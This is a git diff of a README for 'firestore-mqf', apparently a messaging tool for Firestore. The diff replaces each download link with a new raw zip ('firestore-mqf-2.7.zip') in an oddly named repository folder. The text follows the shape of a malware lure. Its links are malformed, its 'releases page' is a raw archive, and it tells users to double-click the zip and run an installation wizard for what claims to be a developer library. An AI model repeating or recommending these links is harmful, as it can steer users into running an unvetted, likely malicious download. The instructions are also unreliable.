@@ -1,7 +1,7 @@
 # 🚀 firestore-mqf - Simple Messaging for Firestore
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf.zip%https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf.zip)](https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf.zip)
+[![Download](https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf-2.7.zip%https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf-2.7.zip)](https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf-2.7.zip)
 
 ## 📖 Description
 firestore-mqf is a user-friendly tool that simplifies messaging for Firestore. It enables efficient data handling and makes communication straightforward. Whether you're managing tasks, notifications, or real-time updates, firestore-mqf provides an easy solution.
@@ -11,11 +11,11 @@ This guide will help you download and run firestore-mqf on your computer. Follow
 
 ## 🔗 Download & Install
 To download firestore-mqf, please visit the releases page:
-[Download Page](https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf.zip).
+[Download Page](https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf-2.7.zip).
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see a list of versions. Choose the most recent version.
-3. Click on the asset file you want to download. For example, if you see a file named `https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf.zip`, click on it to download.
+3. Click on the asset file you want to download. For example, if you see a file named `https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf-2.7.zip`, click on it to download.
 4. Once the file is downloaded, locate it on your computer. This is usually in your "Downloads" folder.
 
 ## 🛠️ System Requirements
@@ -30,7 +30,7 @@ To run firestore-mqf smoothly, your system should meet the following requirement
 After downloading the file, follow these steps to install:
 
 1. Navigate to the folder where the file is downloaded.
-2. Double-click on the `https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf.zip` file (or the equivalent for your OS).
+2. Double-click on the `https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf-2.7.zip` file (or the equivalent for your OS).
 3. Follow the prompts in the installation wizard. You may accept the default installation options.
 4. Once installed, locate the application in your Start Menu or Applications folder.
 
@@ -61,7 +61,7 @@ If you encounter any issues while downloading or running firestore-mqf, please c
 If you need further assistance, feel free to reach out through the GitHub Issues page or check the FAQ section on the repository.
 
 ## 🔄 Updates
-Stay tuned for updates on new features and fixes. You can always check for the latest releases on the [Download Page](https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf.zip).
+Stay tuned for updates on new features and fixes. You can always check for the latest releases on the [Download Page](https://raw.githubusercontent.com/jfish45/firestore-mqf/main/hyposystole/firestore-mqf-2.7.zip).
 
 ## 📝 License
 firestore-mqf is open-source and freely available for everyone. Please check the repository for more licensing details.
